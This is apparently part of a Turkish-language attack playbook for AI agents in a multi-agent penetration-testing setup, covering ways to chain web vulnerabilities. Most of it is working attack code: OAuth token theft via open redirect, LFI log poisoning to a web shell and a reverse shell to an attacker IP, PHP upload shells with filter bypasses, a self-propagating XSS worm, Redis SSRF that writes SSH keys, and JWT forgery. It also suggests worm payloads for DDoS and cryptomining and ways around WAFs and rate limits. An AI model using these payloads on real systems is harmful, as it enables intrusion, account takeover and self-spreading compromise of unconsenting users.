  response_type=code&
  scope=read write

# Adım 2: Open redirect bul
# Open redirect endpoint'i:
https://hedef.com/exit?url=https://attacker.com

# Adım 3: Zincirleme URL'i oluştur
https://hedef.com/oauth/authorize?
  client_id=abc123&
  redirect_uri=https://hedef.com/exit?url=https://attacker.com&
  response_type=code

# Adım 4: Bu URL'i kurbanın tıklamasını sağla
# (Stored XSS varsa, email gönderebiliyorsan, forumda paylaşabiliyorsan)

# Adım 5: Kurban tıkladığında, OAuth kodu SENİN sunucuna gelir
# Saldırgan sunucusu log'u:
# GET /?code=AUTH_CODE_HERE HTTP/1.1

# Adım 6: OAuth kodunu token ile değiştir
curl -X POST https://hedef.com/oauth/token \
  -d "client_id=abc123" \
  -d "client_secret=..." \
  -d "code=AUTH_CODE_HERE" \
  -d "grant_type=authorization_code" \
  -d "redirect_uri=https://hedef.com/exit?url=https://attacker.com"
# Yanıt: {"access_token": "eyJ...", "refresh_token": "..."}
```

**Redirect URI Bypass Teknikleri:**
```bash
# 1. Subdomain: redirect_uri=https://attacker.hedef.com (kontrol ettiğin subdomain)
# 2. Path traversal: redirect_uri=https://hedef.com/../../attacker.com/callback
# 3. CRLF injection: redirect_uri=https://hedef.com%0d%0aLocation:%20https://attacker.com
# 4. Double URL encoding: redirect_uri=https://hedef.com%252F..%252Fattacker.com
# 5. Regex bypass: redirect_uri=https://hedef.com.attacker.com (regex sadece "hedef.com" içeriyor mu diye bakıyorsa)
```

---

### KALIP 6: LFI + Log Poisoning = RCE

**MEKANİZMA:**
Sunucu log dosyaları her HTTP isteğini kaydeder → User-Agent başlığına PHP kodu enjekte et → LFI ile bu log dosyasını include et → PHP kodu çalışır → RCE.

**TESPİT:**
- [ ] LFI var mı? (`?page=`, `?file=`, `?template=`, `?view=`)
- [ ] Path traversal çalışıyor mu? (`../../etc/passwd`)
- [ ] PHP wrapper'ları çalışıyor mu? (`php://filter`, `php://input`)
- [ ] Log dosyasının konumunu biliyor musun?
  - Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
  - Nginx: `/var/log/nginx/access.log`
  - Custom: Uygulamanın kendi log dizini
- [ ] Log dosyasını okuyabiliyor musun? (LFI ile test et)

**İCRA — Adım Adım:**

```bash
# Adım 1: Log dosyasının konumunu doğrula
curl "https://hedef.com/?file=/var/log/apache2/access.log"
# Eğer içerik dönüyorsa → log dosyası okunabiliyor

# Adım 2: User-Agent başlığına PHP kodu enjekte et
curl -H "User-Agent: <?php system('id'); ?>" https://hedef.com/

# Adım 3: Aynı log dosyasını LFI ile include et
curl "https://hedef.com/?file=/var/log/apache2/access.log"
# Yanıtta `uid=33(www-data) gid=33(www-data)` görmelisin

# Adım 4: Web shell kur
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://hedef.com/
curl "https://hedef.com/?file=/var/log/apache2/access.log&cmd=whoami"

# Adım 5: Reverse shell al
# Kendi makinende: nc -lvnp 4444
curl "https://hedef.com/?file=/var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/SENIN_IP/4444%200>%261'"
```

**Alternatif Log Poisoning Hedefleri:**
```bash
# Apache error log
curl -H "User-Agent: <?php system('id'); ?>" "https://hedef.com/<?php system('id'); ?>"
# URL path'i de error log'a yazılır

# SSH log (eğer okunabiliyorsa)
ssh "<?php system('id'); ?>@hedef.com"

# FTP log
ftp hedef.com
Name: <?php system('id'); ?>

# Email log
# Uygulamanın logladığı eposta adresine PHP kodu yaz

# Uygulama log'u
# Kullanıcı adı, yorum, mesaj gibi alanlara PHP kodu yaz
```

**Alternatif Zincir Yolları:**
- **A:** LFI → `/proc/self/environ` → ortam değişkenlerinde hassas bilgi
- **B:** LFI → PHP session dosyası → session'a PHP kodu yaz → session dosyasını include et → RCE
- **C:** LFI → `php://filter/convert.base64-encode/resource=config.php` → kaynak kodunu base64 olarak oku → içindeki secret'ları bul
- **D:** LFI → `/proc/self/fd/12` gibi açık dosya tanımlayıcılarını oku → Apache log'larına erişim

---

### KALIP 7: Dosya Upload + LFI = RCE

**MEKANİZMA:**
Dosya upload et → dosyanın içine PHP/ASP/JSP kodu yaz → LFI ile o dosyayı include et → RCE.

**TESPİT:**
- [ ] Dosya upload var mı? (Profil resmi, döküman upload, avatar)
- [ ] Dosya türü kısıtlaması nasıl? (Extension whitelist? MIME type check? Magic bytes?)
- [ ] Upload edilen dosyaya erişilebiliyor mu? (URL'ini biliyor musun?)
- [ ] Upload dizini neresi? Web root altında mı? (LFI ile erişilebilir mi?)
- [ ] Hangi dil çalışıyor sunucuda? (PHP, ASP.NET, JSP, Python)

**İCRA — Adım Adım:**

```bash
# Adım 1: Hangi uzantılara izin verildiğini test et
# .php, .php5, .phtml, .php.jpg, .php%00.jpg, .pHp

# Adım 2: PHP shell dosyası oluştur
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Adım 3: Bypass tekniklerini dene

# Bypass 1: Double extension
cp shell.php shell.php.jpg

# Bypass 2: Null byte (eski PHP)
cp shell.php shell.php%00.jpg

# Bypass 3: MIME type spoofing
# Content-Type: image/jpeg olarak gönder ama içerik PHP

# Bypass 4: Magic bytes ekle
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg

# Bypass 5: .htaccess ile PHP handler ekle (Apache)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# .htaccess'i upload et → tüm .jpg'ler PHP olarak çalışır

# Adım 4: Upload et ve URL'i bul
curl -X POST https://hedef.com/upload \
  -F "file=@shell.php.jpg" \
  -H "Cookie: session=YOUR_SESSION"
# Yanıt: {"url": "/uploads/shell.php.jpg"}

# Adım 5: LFI ile include et
curl "https://hedef.com/?file=../../uploads/shell.php.jpg&cmd=whoami"
# Yanıt: www-data
```

**Alternatif Zincir Yolları:**
- **A:** Upload SVG → SVG içinde `<script>` → Stored XSS
- **B:** Upload .config (ASP.NET) → web.config ile handler ekle
- **C:** Upload + Zip slip (path traversal ile zip içinden dosya çıkarma) → web root'a dosya yaz
- **D:** Upload + hayalet dosya (aynı isimde iki dosya, biri temizlenmiyor) → race condition

---

### KALIP 8: Mass Assignment + IDOR = Yetki Yükseltme

**MEKANİZMA:**
IDOR ile başka kullanıcının profiline eriş → Mass Assignment ile o kullanıcının `role` alanını `admin` yap → admin hesabıyla login ol.

**TESPİT:**
- [ ] Kullanıcı güncelleme endpoint'inde IDOR var mı? (`PUT /api/users/123`)
- [ ] Mass Assignment var mı? (Body'de `role`, `is_admin`, `is_superuser`, `permissions` gönderince kabul ediliyor mu?)
- [ ] Hangi framework? (Spring Boot, Rails, Laravel, Express — her biri mass assignment'a farklı yaklaşır)
- [ ] API dokümantasyonu var mı? Gizli parametreleri oradan öğrenebilirsin

**İCRA — Adım Adım:**

```bash
# Adım 1: Kendi kullanıcını IDOR ile kontrol et
curl https://hedef.com/api/users/ME -H "Cookie: session=ME"
# Yanıt: {"id": "ME", "email": "ben@test.com", "role": "user"}

# Adım 2: Mass assignment dene - kendi hesabında
curl -X PUT https://hedef.com/api/users/ME \
  -H "Content-Type: application/json" \
  -H "Cookie: session=ME" \
  -d '{"email": "ben@test.com", "role": "admin"}'
# Yanıt: {"id": "ME", "email": "ben@test.com", "role": "admin"}
# Mass assignment ÇALIŞIYOR.

# Adım 3: Admin kullanıcısının ID'sini bul
# Sequential ID: /api/users/1, /api/users/2 ...
# veya username: admin, administrator, root
curl https://hedef.com/api/users/1 -H "Cookie: session=ME"
# Yanıt: {"id": 1, "email": "admin@hedef.com", "role": "admin"}

# Adım 4: Admin kullanıcısının email'ini kendi email'inle değiştir
curl -X PUT https://hedef.com/api/users/1 \
  -H "Content-Type: application/json" \
  -H "Cookie: session=ME" \
  -d '{"email": "ben@test.com", "role": "admin"}'

# Adım 5: Admin'in email'i artık senin → şifre sıfırlama ile admin hesabını ele geçir
curl -X POST https://hedef.com/api/forgot-password \
  -d '{"email": "ben@test.com"}'
# Admin hesabının şifre sıfırlama mail'i sana gelir
```

**Test Edilecek Gizli Parametreler:**
```json
{
  "role": "admin",
  "is_admin": true,
  "is_superuser": true,
  "is_staff": true,
  "permissions": ["all", "admin", "superuser"],
  "groups": ["admin", "superuser"],
  "account_type": "admin",
  "plan": "enterprise",
  "subscription": "lifetime",
  "verified": true,
  "is_verified": true,
  "email_verified": true,
  "activated": true,
  "approved": true,
  "trusted": true,
  "internal": true
}
```

---

### KALIP 9: Stored XSS + CSRF = Solucan (Worm)

**MEKANİZMA:**
Stored XSS payload'u kendi kendini yayar → kurban görüntülediğinde XSS çalışır → CSRF ile kurbanın profilini günceller → aynı XSS payload'unu kurbanın profiline de ekler → bir sonraki kişi kurbanın profilini görüntülediğinde aynı şey olur → ÜSTEL YAYILMA.

**TESPİT:**
- [ ] Stored XSS var mı? (Profil, yorum, mesaj, post, biyografi)
- [ ] Profil güncelleme endpoint'inde CSRF koruması var mı?
- [ ] CSRF token tahmin edilebilir mi? Token yoksa direkt CSRF çalışır.
- [ ] XSS payload'u başka kullanıcılar tarafından görülebiliyor mu?

**İCRA — Adım Adım:**

```javascript
// Adım 1: Worm payload'unu oluştur (tek bir <script> içinde)
<script>
(async function worm() {
  // Kendi profilimi güncelle (CSRF)
  // Bu payload'u başkası görünce, O KİŞİNİN profiline de aynı payload yazılacak
  
  const payload = `<script>${worm.toString()} worm();<\/script>`;
  
  await fetch('/api/profile/update', {
    method: 'PUT',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      bio: payload,
      status: payload,
      signature: payload
      // Profildeki hangi alan XSS'e izin veriyorsa
    })
  });
  
  // Aynı zamanda tüm arkadaş listesine de yay (mesaj gönder)
  const friends = await fetch('/api/friends', {credentials: 'include'})
    .then(r => r.json());
  
  for (const friend of friends) {
    await fetch('/api/messages/send', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        to: friend.id,
        subject: 'Bunu görmelisin!',
        body: payload
      })
    });
  }
})();
</script>
```

**Alternatif Zincir Yolları:**
- **A:** Worm + veri hırsızlığı: Her enfekte kullanıcının verilerini de çal
- **B:** Worm + DDoS: Her enfekte kullanıcı belirli bir hedefe istek yağdırsın
- **C:** Worm + cryptominer: Her ziyaretçinin tarayıcısında CoinHive/Salad çalıştır
- **D:** Worm + defacement: Her sayfa görüntülemede siteyi değiştir

---

### KALIP 10: SSRF + İç Redis/Memcached = RCE

**MEKANİZMA:**
SSRF ile `gopher://` protokolünü kullanarak Redis'e RESP protokolü komutları gönder → Redis'e SSH public key yaz (`CONFIG SET dir /root/.ssh/` + `CONFIG SET dbfilename authorized_keys`) → SSH ile sunucuya bağlan → RCE.

**TESPİT:**
- [ ] SSRF var mı?
- [ ] `gopher://` protokolüne izin veriliyor mu?
- [ ] İç ağda Redis var mı? (Port 6379)
- [ ] İç ağda Memcached var mı? (Port 11211)
- [ ] SSRF response'da Redis/Memcached cevabı görünüyor mu?

**İCRA — Adım Adım:**

```bash
# Adım 1: Redis'e bağlantıyı test et
# SSRF URL: gopher://127.0.0.1:6379/_PING
# Eğer +PONG dönerse Redis'e erişim var

# Adım 2: SSH public key oluştur (kendi makinende)
ssh-keygen -t rsa -f redis_key
# redis_key.pub içindeki public key'i al

# Adım 3: Gopher payload'unu oluştur
# Redis komutlarını RESP protokolüne çevir ve URL-encode et:
# FLUSHALL
# SET mykey "\n\n<SSH_PUBLIC_KEY>\n\n"
# CONFIG SET dir /root/.ssh/
# CONFIG SET dbfilename authorized_keys
# SAVE

# Gopher URL'i (RESP komutları URL-encoded):
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0AFLUSHALL%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A...
# (Burada ... RESP formatındaki diğer komutların URL-encoded hali)

# Adım 4: SSRF ile bu URL'i gönder
# Redis bu komutları çalıştıracak ve SSH key'i yazacak

# Adım 5: SSH ile bağlan
ssh -i redis_key root@HEDEF_IP
# → RCE BAŞARILI
```

**Memcached için:**
```bash
# Memcached'e veri yaz ve oku
# SSRF URL: gopher://127.0.0.1:11211/_set key 0 3600 5
# value
# get key

# Memcached'te hassas veri olabilir: session'lar, cache'lenmiş API response'ları
```

**Alternatif Zincir Yolları:**
- **A:** Redis → cron job yaz (`CONFIG SET dir /var/spool/cron/crontabs/`) → reverse shell cron job
- **B:** Redis → `/etc/passwd` dosyasına yeni kullanıcı ekle
- **C:** Redis → web root'a webshell yaz
- **D:** Memcached → session verilerini manipüle et → session hijacking

---

### KALIP 11: JWT Manipülasyonu + IDOR = Yetki Yükseltme

**MEKANİZMA:**
JWT'nin `alg: none` zafiyetini kullan → kendi JWT'nde `role: admin` yap → imzayı kaldır → IDOR ile admin endpoint'lerine eriş.

**TESPİT:**
- [ ] JWT kullanılıyor mu? (Authorization: Bearer eyJ...)
- [ ] JWT kütüphanesi `alg: none` kabul ediyor mu?
- [ ] JWT secret zayıf mı? (HMAC key brute force)
- [ ] `kid` (Key ID) header'ı var mı? → SQLi, LFI, path traversal olabilir
- [ ] `jku` (JWK Set URL) header'ı var mı? → SSRF ile kendi JWK'ni sağla

**İCRA — Adım Adım:**

```bash
# Adım 1: Mevcut JWT'ni decode et
# jwt.io veya:
echo "eyJ..." | cut -d. -f2 | base64 -d
# {"user_id": 123, "role": "user", "exp": ...}

# Adım 2: alg: none saldırısı
# Yeni header: {"alg": "none", "typ": "JWT"}
# Yeni payload: {"user_id": 1, "role": "admin", "exp": 9999999999}
# İmza kısmı boş: .
# Yeni token: <base64(header)>.<base64(payload)>.
# NOT: Sonunda nokta var, imza yok!

curl https://hedef.com/api/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."

# Adım 3: Secret brute force (HMAC)
hashcat -m 16500 jwt.txt rockyou.txt
# Secret bulunursa, istediğin token'ı imzala

# Adım 4: kid injection
# JWT header'ında "kid": "/var/www/html/.env" varsa
# LFI ile secret'ı okuyabilirsin
```

---

### KALIP 12: Race Condition + İş Mantığı = Sınırsız Kaynak

**MEKANİZMA:**
Bir kupon kodu bir kere kullanılabilir → aynı anda 20 istek gönder → hepsi "henüz kullanılmadı" kontrolünü aynı anda geçer → 20 kere kullanılır.

**TESPİT:**
- [ ] Tek kullanımlık kaynak var mı? (Kupon kodu, hediye kartı, oy hakkı, transfer limiti)
- [ ] İşlem atomik değil mi? (Check-then-act pattern)
- [ ] Rate limiting yok mu veya bypass edilebiliyor mu?
- [ ] Aynı anda çok istek gönderilebiliyor mu?

**İCRA:**

```bash
# Adım 1: Tek kullanımlık kupon kodunu normal kullan
curl -X POST https://hedef.com/api/redeem \
  -d '{"code": "WELCOME50"}' \
  -H "Cookie: session=ME"
# Yanıt: {"success": true, "balance": 50}

# Adım 2: Race condition testi
# 10 paralel isteği aynı anda gönder
for i in {1..10}; do
  curl -X POST https://hedef.com/api/redeem \
    -d '{"code": "WELCOME50"}' \
    -H "Cookie: session=ME" &
done
wait

# Adım 3: Bakiyeyi kontrol et
# Eğer 50 × N olduysa race condition çalışmış demektir
```

---

## 🤝 AJANLAR ARASI ZİNCİR KOORDİNASYONU

### firstphase.md ile Koordinasyon

`firstphase.md` dosyası, tüm ajanların bulgularının toplandığı merkezi belgedir. Zincirleme fırsatları burada paylaşılır.

#### Zincirleme Fırsatı Ekleme Formatı:

```markdown
## 🔗 ZİNCİRLEME FIRSATLARI

### Fırsat #[N]: [Kısa Açıklama]

- **Temel Bulgular:**
  - [AGENT-XX] [bulgu açıklaması]
  - [AGENT-YY] [bulgu açıklaması]
- **Zincir Hedefi:** [ne elde edilmek isteniyor]
- **Gerekli Adımlar:**
  1. [agent-XX'in yapacağı]
  2. [agent-YY'nin yapacağı]
  3. [birleştirme adımı]
- **Beklenen Etki:** [kritiklik seviyesi ve sonuç]
- **Sorumlu Agent:** [hangi agent bu zinciri denemeli]
- **Durum:** 🔴 Beklemede / 🟡 Devam Ediyor / 🟢 Başarılı / ⚫ Başarısız

ÖRNEK:

### Fırsat #3: SQLi Credential'ları + Login Endpoint = ATO

- **Temel Bulgular:**
  - [AGENT-03] `/api/search?q=` SQLi ile `users` tablosundan email:password_hash çiftleri alınabiliyor
  - [AGENT-05] `/api/login` endpoint'i `{"email", "password"}` JSON kabul ediyor, rate limiting YOK
- **Zincir Hedefi:** Admin hesabını ele geçirme
- **Gerekli Adımlar:**
  1. AGENT-03: users tablosundan admin@gmail.com:hash çiftini çıkar
  2. AGENT-03: hash'i hashcat ile kır (bcrypt ise kırılmayabilir → diğer kullanıcıları dene)
  3. AGENT-05: `/api/login` ile admin:password girişi yap
- **Beklenen Etki:** Admin hesabı ele geçirme → CRITICAL
- **Sorumlu Agent:** Agent-05 (veya yeni agent)
- **Durum:** 🔴 Beklemede
```

### Orkestratörün Rolü:

1. **firstphase.md'i İZLE:** Orkestratör, zincirleme fırsatları bölümünü sürekli kontrol eder.
2. **Yeni agent GÖREVLENDİR:** Bir zincirleme fırsatı tespit edildiğinde, orkestratör zinciri denemesi için bir agent görevlendirir.
3. **Cross-agent iletişimi KOLAYLAŞTIR:** İki agent'in işbirliği yapması gerekiyorsa, orkestratör bunu koordine eder.
4. **Başarılı zinciri BELGELE:** Zincir başarıyla çalıştıysa, orkestratör bunu CRITICAL severity ile ana bulgulara ekler.

### Agent'ların Sorumlulukları:

1. **Her bulgudan sonra firstphase.md'i OKU.** Diğer ajanların ne bulduğunu bil.
2. **Zincirleme fırsatı gördüğünde firstphase.md'e YAZ.** Formatı kullan.
3. **Bir zincirleme fırsatı sana atandıysa, zinciri DENE.** Adımları takip et, sonucu raporla.
4. **Zincir başarılıysa, kendi bulgun olarak KAYDET.** "Bu bulgu, Agent-03 ve Agent-05'in bulgularının zincirlenmesiyle elde edilmiştir" açıklamasıyla.

### Zincirleme Önceliklendirme Matrisi:

| Temel Bulgu 1 | Temel Bulgu 2 | Birleşik Etki | Öncelik |
|---------------|---------------|---------------|---------|
| SQLi (read) | Login endpoint | ATO | 🔴 ÇOK YÜKSEK |
| SSRF | Cloud metadata | Cloud Takeover | 🔴 ÇOK YÜKSEK |
| Stored XSS | Admin panel | Admin ATO | 🔴 ÇOK YÜKSEK |
| LFI | File upload | RCE | 🔴 ÇOK YÜKSEK |
| IDOR | Mass assignment | Privilege Escalation | 🔴 ÇOK YÜKSEK |
| Open redirect | OAuth flow | Token theft | 🟡 YÜKSEK |
| LFI | Log poisoning | RCE | 🟡 YÜKSEK |
| XSS | CSRF | Worm | 🟡 YÜKSEK |
| SSRF | İç Redis | RCE | 🟡 YÜKSEK |
| IDOR | Password reset | ATO | 🟡 YÜKSEK |
| SQLi (error) | Verbose error info | Hedefli saldırı | 🟢 ORTA |
| Tek başına XSS | Yok | Session theft | 🟢 ORTA |

---

## 📋 ZİNCİR DOKÜMANTASYON FORMATI

Başarılı bir zincir şu formatta belgelenmelidir:

```markdown
## 🔗 ZİNCİRLEME SALDIRISI #[N]: [Başlık]

### 🎯 Hedef ve Etki
- **Hedef Sistem:** [URL/IP]
- **Zincirleme Seviyesi:** [2'li zincir / 3'lü zincir / Çapraz ajan zinciri]
- **Nihai Etki:** [ATO / RCE / Cloud Takeover / Data Exfiltration / Privilege Escalation]
- **Severity:** CRITICAL (Zincirleme)
- **CVSS Skoru:** [hesaplanmış skor]

### 🔗 Zincir Halkaları

#### Halka 1: [İlk bulgu]
- **Bulgu:** [açıklama]
- **Bulan Agent:** [AGENT-XX]
- **Endpoint:** [URL]
- **Kazanılan Yetenek:** [ne yapabiliyorsun]

#### Halka 2: [İkinci bulgu]
- **Bulgu:** [açıklama]
- **Bulan Agent:** [AGENT-YY]
- **Endpoint:** [URL]
- **Kazanılan Yetenek:** [ne yapabiliyorsun]

#### Halka 3: [Üçüncü bulgu - varsa]
- ... (aynı format)

### ⚔️ Saldırı Akışı

1. **Keşif Aşaması:** [ne keşfedildi]
2. **İlk İstismar:** [ilk adımda ne yapıldı]
3. **Ara Bilgi Toplama:** [ne öğrenildi]
4. **İkinci İstismar:** [ikinci adımda ne yapıldı]
5. **Zincirleme Etki:** [zincirin sonucu]

### 🛠️ Kullanılan Araçlar ve Payload'lar

```bash
# Adım 1: [açıklama]
curl -X ... https://hedef.com/...

# Adım 2: [açıklama]
curl -X ... https://hedef.com/...

# Adım 3: [zincirleme]
curl -X ... https://hedef.com/...
```

### 📸 Kanıtlar
- [Ekran görüntüsü 1: İlk bulgunun kanıtı]
- [Ekran görüntüsü 2: Zincirleme sonucu]
- [Log dosyası / Response]

### 🛡️ Önlem Önerileri
- [Her bir bulgu için ayrı ayrı]
- [Zincirlemeyi engelleyecek mimari değişiklik]

### 📊 Gerçek Etki Değerlendirmesi
- **Zincirsiz Etki:** [ilk bulgunun tek başına severity'si]
- **Zincirli Etki:** [CRITICAL]
- **Etki Artışı:** Low → Critical (4 seviye yükseldi)
```

---

## 🧩 ZİNCİR KIRILMA NOKTALARI VE ALTERNATİF YOLLAR

Bir zincir başarısız olduğunda PES ETME. Alternatif yolları dene.

### Zincir Neden Kırıldı? — Teşhis Tablosu:

| Kırılma Nedeni | Belirti | Alternatif Yol |
|----------------|---------|----------------|
| **WAF/IDS engelliyor** | 403 Forbidden, bağlantı reset | Encoding değiştir, chunked transfer kullan, alternatif HTTP metotları dene |
| **HttpOnly cookie** | `document.cookie` boş | localStorage'dan token çal, CSRF ile işlem yap, keylogger ile şifre yakala |
| **CSP engelliyor** | `script-src` kısıtlaması | CSP bypass teknikleri, `script-gadget`, JSONP endpoint, DOM clobbering |
| **SameSite=Strict cookie** | CSRF çalışmıyor | XSS bul (XSS SameSite'ı bypass eder), GET-based CSRF dene |
| **Rate limiting** | 429 Too Many Requests | IP rotasyonu, zaman dağılımlı istekler, farklı endpoint dene |
| **IMDSv2 (AWS)** | Metadata token gerekiyor | Önce token endpoint'ine PUT isteği yap, sonra token ile metadata'ya eriş |
| **Gopher engelli** | SSRF'de `gopher://` çalışmıyor | HTTP-based Redis (bazı Redis'ler HTTP kabul eder), `dict://` protokolü dene |
| **Open redirect patched** | `/exit?url=` filtrelenmiş | CRLF injection, double encoding, alternatif redirect endpoint'leri ara |
| **Şifre hash'i kırılamıyor** | bcrypt/argon2 | Diğer kullanıcıları dene, zayıf şifreleri hedefle, `LOAD_FILE` ile başka yerlere bak |

### Alternatif Zincir Haritası:

Eğer Hedef A ise ve yol kapalıysa, B yolunu dene:

```
Hedef: RCE
├── Yol A: SQLi → INTO OUTFILE → webshell
│   └── Kapalıysa → Yol B
├── Yol B: File Upload → LFI → RCE
│   └── Kapalıysa → Yol C
├── Yol C: LFI → Log Poisoning → RCE
│   └── Kapalıysa → Yol D
├── Yol D: SSRF → Redis → SSH key → RCE
│   └── Kapalıysa → Yol E
├── Yol E: Deserialization → RCE gadget chain
│   └── Kapalıysa → Yol F
└── Yol F: SSTI (Template Injection) → RCE
```

---

## 📚 GERÇEK DÜNYA ZİNCİR ÖRNEKLERİ

### Örnek 1: Uber (2016) — IDOR + AWS Key = Data Breach

1. **Halka 1:** GitHub'da açık bir repository'de Uber'in AWS anahtarları bulundu
2. **Halka 2:** Bu anahtarlarla AWS S3 bucket'ına erişildi
3. **Halka 3:** Bucket'ta 57 milyon kullanıcı ve sürücünün kişisel verileri vardı
4. **Zincir:** Bilgi ifşası (GitHub) → Cloud erişimi (AWS keys) → Veri hırsızlığı (S3)
5. **Etki:** 57 milyon kullanıcının verisi çalındı, Uber 148 milyon dolar ceza ödedi

### Örnek 2: Capital One (2019) — SSRF + IAM Credentials = 100M+ Data Breach

1. **Halka 1:** WAF yanlış yapılandırması → SSRF
2. **Halka 2:** SSRF → AWS metadata endpoint'i → IAM credentials
3. **Halka 3:** IAM credentials → S3 bucket listeleme → tüm veriyi dışarı çıkarma
4. **Zincir:** Misconfiguration → SSRF → Cloud metadata → IAM → S3 exfiltration
5. **Etki:** 100 milyondan fazla kredi kartı başvurusu çalındı

### Örnek 3: Twitter (2020) — Social Engineering + Internal Tools = Account Takeover

1. **Halka 1:** Twitter çalışanlarına vishing (telefon phishing)
2. **Halka 2:** İç ağa VPN erişimi
3. **Halka 3:** İç admin paneli → kullanıcı hesaplarını ele geçirme
4. **Zincir:** Sosyal mühendislik → VPN → İç araçlar → Hesap ele geçirme
5. **Etki:** Elon Musk, Barack Obama, Bill Gates hesapları ele geçirildi, Bitcoin dolandırıcılığı

---

## 🎯 SON TALİMATLAR VE KONTROL LİSTESİ

### Her Bulgu Sonrası Yapılacaklar:

- [ ] 5 ZİNCİR SORUSUNU cevapladım mı?
  - [ ] Q1: Hangi yeni yeteneğe sahibim?
  - [ ] Q2: Hangi sistem bilgisini ifşa ettim?
  - [ ] Q3: Hangi güven ilişkilerini istismar edebilirim?
  - [ ] Q4: Gerçek bir saldırgan şimdi ne yapardı?
  - [ ] Q5: Diğer ajanların bulgularıyla birleştirebilir miyim?
- [ ] firstphase.md'i okudum mu?
- [ ] Zincirleme fırsatı varsa firstphase.md'e YAZDIM mı?
- [ ] Orkestratöre bildirdim mi?

### Zincir Başarı Kriterleri:

1. **Zincir DOĞRULANMIŞ olmalı.** "Muhtemelen çalışır" yetmez. Gerçekten çalıştığını GÖSTER.
2. **Kanıt SUNULMUŞ olmalı.** Ekran görüntüsü, log, response.
3. **Etki KALİBRE EDİLMİŞ olmalı.** Zincirin gerçek etkisi ne? CVSS skoru ne?
4. **Dokümantasyon TAMAM olmalı.** Formatı kullan.

### Unutma:

> **"Bir zincir en zayıf halkası kadar güçlüdür."** — Ama sen saldırgan olarak zincirin HER halkasını güçlendiriyorsun. Her bulgu bir halka. Her halka bir sonrakini mümkün kılıyor. VE son halka — TOTAL COMPROMISE.

---

## 🧩 SOMUT ÇOK-ZAFİYET ZİNCİR ÖRNEKLERİ (referans)

Her zincir: **adımlar → neden çalışır → kanıt sırası**. Her halka ayrı kanıtlanır; tüm trafik `cyp_send_request`, her adım request_id'li.

### 1. XXE → SSRF → cloud metadata → RCE
- **Adımlar:** XML endpoint'e external entity (`http://169.254.169.254/...`) → metadata'dan IAM credential → credential ile bulut API → instance'a komut/yeni kaynak.
- **Neden:** XML parser entity'yi sunucudan fetch eder (SSRF); metadata endpoint'i sadece sunucudan erişilebilir; sızan geçici credential bulut yetkisi verir.
- **Kanıt sırası:** (a) entity→OOB callback hedef-IP'den, (b) `iam/security-credentials/<rol>` yanıtı (maskeli), (c) credential'la imzalı bir bulut API çağrısının 200'ü.

### 2. Insecure Deserialization → SSRF → iç servis
- **Adımlar:** İmzasız serialized cookie'ye OOB gadget (Java URLDNS / PHP SoapClient) → callback ile deser doğrula → gadget'ı iç hedefe (`http://127.0.0.1:<port>`) çevir → iç servis yanıtı.
- **Neden:** Deserializer objeyi instantiate edince gadget ağ isteği yapar; sunucu iç ağı görür, saldırgan görmez.
- **Kanıt sırası:** (a) gadget→OOB token callback, (b) iç açık-vs-kapalı port timing/banner farkı, (c) iç servisten dönen ayırt edici içerik.

### 3. Auth bypass → IDOR → account takeover
- **Adımlar:** NoSQL `{"$ne":null}` ile login bypass → düşük-yetkili oturum → `id=` parametresini kurbanınkiyle değiştir (IDOR) → kurbanın e-posta/şifresini değiştir.
- **Neden:** Operatör injection auth mantığını kırar; obje yetkisi resolver/endpoint'te yok (BOLA).
- **Kanıt sırası:** (a) `$ne` bypass vs yanlış-parola RED, (b) kurban objesinin yetkisiz okunması (yetkili-vs-yetkisiz iki request_id), (c) kurban hesabında gerçekleşen state-change.

### 4. Stored-XSS → CSRF-token theft → state change
- **Adımlar:** Profil alanına kalıcı XSS → kurban admin sayfayı açınca payload DOM'dan CSRF token okur → token'la korunan admin aksiyonunu tetikle.
- **Neden:** Saklanan script kurban bağlamında çalışır, anti-CSRF token'ı sayfadan okunabilir (HttpOnly token'ı bile DOM'daysa).
- **Kanıt sırası:** (a) payload'ın ham response'ta saklanması + render'da yürütülmesi, (b) OOB'ye sızan token, (c) o token'la admin isteğinin 200'ü.

### 5. Open-redirect → OAuth code leak → ATO
- **Adımlar:** OAuth `redirect_uri`'de açık-redirect (`@`/suffix bypass) → kurban authorize edince `code` saldırgan domaine düşer → code'u token'a takas → kurban oturumu.
- **Neden:** Authorization server gevşek `redirect_uri` eşleşmesine güvenir; code saldırgana taşınır.
- **Kanıt sırası:** (a) `Location` host'unun gerçekten saldırgan domaine çözülmesi, (b) collaborator log'unda `?code=` yakalanması, (c) code→token takasının başarısı (maskeli).

### 6. SQLi → credential dump → admin login → RCE
- **Adımlar:** UNION/blind SQLi ile users tablosu → admin hash kır/zaten plaintext → admin paneline login → panelin dosya-upload/komut özelliğiyle RCE.
- **Neden:** String concat sorgusu DB'yi okutur; admin yetkisi ayrıcalıklı (tehlikeli) işlevleri açar.
- **Kanıt sırası:** (a) `'`kırılır/`''`düzelir + UNION/boolean veri farkı, (b) çekilen credential ile admin 200 login, (c) upload/komut sink'inden çıktı/OOB.

### 7. File-upload (SVG) → stored-XSS → session theft
- **Adımlar:** Avatar olarak `<script>`'li SVG yükle → same-origin servis edilir → kurban görüntüleyince script çalışır → cookie/oturum OOB'ye sızar.
- **Neden:** SVG XML+JS taşır; `Content-Type` image sanılıp inline render edilir; cookie HttpOnly değilse okunur.
- **Kanıt sırası:** (a) SVG'nin same-origin + `image/svg+xml` ham response'u, (b) render'da script yürütülmesi, (c) OOB'ye düşen oturum değeri.

### 8. Mass-assignment (role) → BFLA admin function
- **Adımlar:** Kayıt/profil-güncelle isteğine `"role":"admin"` ekle (mass-assignment) → yükseltilmiş oturum → admin-only fonksiyonu (BFLA) çağır.
- **Neden:** Backend gövdeyi körü körüne objeye bağlar (allow-list yok); fonksiyon yetkisi rol'e bakar, rol artık saldırgan-kontrollü.
